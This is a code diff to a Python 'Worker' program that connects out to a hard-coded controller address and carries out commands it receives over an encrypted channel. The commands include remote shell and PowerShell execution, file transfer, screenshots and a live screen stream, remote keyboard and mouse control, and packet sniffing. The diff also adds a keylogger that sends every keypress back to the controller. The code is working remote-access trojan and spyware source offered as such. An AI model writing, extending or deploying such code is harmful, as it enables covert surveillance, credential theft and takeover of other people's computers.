@@ -1,25 +1,43 @@
 import json
 import socket
+import threading
 import time
 from typing import Callable
 import os
 import struct
 import subprocess
-from encryption.rsa import rsa
+import pynput.keyboard
+from rsa import rsa
 import hashlib
-from encryption.DHE.my_hmac import HMAC
-from encryption.aes.aes_types import CTR
+from DHE.my_hmac import HMAC
+from aes.aes_types import CTR
 import hmac
 import cv2
 import numpy as np
 import pyautogui
-import keyboard
+from pynput.keyboard import Controller , Listener, Key
 from pynput.mouse import Button,Controller
 from scapy.all import sniff
 from scapy.utils import wrpcap
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
 import mss
-
-
+global STREAM
+special_keys = {
+    "enter": Key.enter,
+    "esc": Key.esc,
+    "space": Key.space,
+    "tab": Key.tab,
+    "shift": Key.shift,
+    "ctrl": Key.ctrl,
+    "alt": Key.alt,
+    "backspace": Key.backspace,
+    "delete": Key.delete,
+    "up": Key.up,
+    "down": Key.down,
+    "left": Key.left,
+    "right": Key.right,
+}
 def cmd(command:str) ->bytes:
     return os.popen(command).read().encode()
 
@@ -45,16 +63,13 @@ def send_file(file_str: bytes) ->bytes:
         return f"error writing the file: {e}".encode()
 
 
-def listen_to_keys(doesnt_matter:str)->bytes:
-    while True:
-        key =keyboard.read_event()
-        if key.event_type == "down":
-            return f"the key {key.name} was used".encode()
 
 def press_key_in_worker(key_data:str)->bytes:
     data = key_data.split(":")
     type = data[0]
-    key = data[1]
+    key_name = data[1]
+    key = special_keys.get(key_name.lower(), key_name)
+    keyboard = pynput.keyboard.Controller()
     if type == "down":
         keyboard.press(key)
     else:
@@ -92,7 +107,7 @@ def map_button_name(name:str):
         return Button.middle
 
 def control_mouse(parameters:bytes) -> bytes:
-    mouse = Controller()
+    mouse = pynput.mouse.Controller()
     payload = json.loads(parameters.decode('utf-8'))
     typ = payload.get("type")
     if typ == "button":
@@ -123,12 +138,16 @@ def sniff_from_worker(parameters:str) -> bytes:
         pcap_bytes = file.read()
     return pcap_bytes
 
+
+
+
+
 def live_stream(doesnt_matter:str) -> bytes:
     with mss.mss() as sct:
         monitor = sct.monitors[1]
         frame = np.array(sct.grab(monitor))
         frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY,50])
+        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
         return buffer.tobytes()
 
 
@@ -140,10 +159,34 @@ class Worker:
         self.stream_client = socket.socket()
         self.private_key, self.public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
         self.rsa = rsa.RSA(my_public_key=self.public_key, my_private_key=self.private_key)
-        self.own_master_key = os.urandom(32)
+        self.own_master_key = os.urandom(16).hex().encode()
+        print(self.own_master_key)
         self.peer_master_key = None
+        self._sock_lock = threading.RLock()
+        self.key_listener = Listener(on_press=self.on_press)
 
+    def on_press(self,key):
+        with self._sock_lock:
+            self.sender(f"{key} was pressed".encode())
 
+    def live_stream(self):
+        global STREAM
+        while True:
+            if STREAM:
+                with mss.mss() as sct:
+                    monitor = sct.monitors[1]
+                    frame = np.array(sct.grab(monitor))
+                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+                    encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+                    self.sender(buffer.tobytes(),stream=True)
+
+    def listen_to_keys(self):
+        if not self.key_listener.running:
+            self.key_listener.start()
+    def stop_listen_to_keys(self):
+        self.key_listener.stop()
+        self.key_listener.join()
+        self.key_listener = Listener(on_press=self.on_press)
 
     def connect(self):
         while True:
@@ -156,6 +199,7 @@ class Worker:
                 self.sender(self.rsa.send(self.own_master_key, hashlib.sha256(self.own_master_key).digest()), seal=False)
                 self.stream_client.connect((self.address[0],self.address[1]+1))
                 self.peer_master_key = self.rsa.receive(self.receiver(open_seal=False)).encode()
+                print(self.peer_master_key)
 
                 print("connection succeeded")
                 break
@@ -190,17 +234,17 @@ class Worker:
         blob = self.recvall(sock, size)
         if open_seal:
             aes_key, mac_key = self.derive_peer_keys()
-            aad = struct.unpack("I", blob[0:4])[0]
+            aad = blob[0:4]
             nonce = blob[4:12]
             tag = blob[-32:]
             c = blob[12:-32]
             header = aad + nonce
             to_mac = header + c
-            calc = HMAC("sha256", to_mac, mac_key).derive()
+            calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
             if not hmac.compare_digest(calc, tag):
                 return b"error: Authentication failed"
-            ctr = CTR(aes_key, nonce)
-            return ctr.decrypt(c)
+            ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
+            return AES.new(aes_key, AES.MODE_CTR, counter=ctr).decrypt(c)
 
         else:
             return blob
@@ -213,11 +257,11 @@ class Worker:
         if seal:
             aes_key, mac_key = self.derive_own_keys()
             nonce = os.urandom(8)
-            ctr = CTR(aes_key, nonce)
-            c = ctr.encrypt(message)
+            ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
+            c = AES.new(aes_key, AES.MODE_CTR, counter=ctr).encrypt(message)
             header = struct.pack("I", len(message)) + nonce
             to_mac = header + c
-            tag = HMAC("sha256", to_mac, mac_key).derive()
+            tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
             data = struct.pack("I", len(header + c + tag)) + header + c + tag
         else:
             data = struct.pack("I", len(message)) + message
@@ -237,8 +281,9 @@ class Worker:
         self.connect()
         while True:
             data = self.receiver()
-            if data == "quit":
+            if data == b"quit":
                 break
+
             if b":" in data:
                 splitted = data.split(b":",1)
                 name = splitted[0].decode()
@@ -248,24 +293,42 @@ class Worker:
                 commend = b"doesnt matter"
             if name not in ["send_file","control_mouse"]:
                 commend = commend.decode()
-
+            if name == "listen_to_keys":
+                self.listen_to_keys()
+                continue
+            if name == "stop_listen_to_keys":
+                self.stop_listen_to_keys()
+                self.sender(b"stopped_listening")
+                continue
             message = self.functions[name](commend)
-            if name not in ["control_mouse", "press_key_in_worker", "live_stream"]:
-                self.sender(message)
+            if name not in ["control_mouse", "press_key_in_worker", "live_stream", "stop_stream", "listen_to_keys", "stop_listen_to_keys"]:
+                with self._sock_lock:
+                    self.sender(message)
             elif name == "live_stream":
                 self.sender(message,stream=True)
         self.client.close()
 
 
 def main():
-    ip = "10.0.0.12"
+
+    ip = "10.0.0.9"
     port = 5555
-    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
+    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,
+                                                 "powershell":powershell,
+                                                 "python":python,
+                                                 "send_file":send_file,
+                                                 "receive_file":receive_file,
+                                                 "screen_shot":screen_shot,
+                                                 "press_key_in_worker":press_key_in_worker,
+                                                 "control_mouse":control_mouse,
+                                                 "sniff_from_worker":sniff_from_worker,
+                                                 "live_stream":live_stream}
     worker = Worker(ip, int(port), functions)
     worker.run()
 
 if __name__ == '__main__':
     main()
+
 
 
 
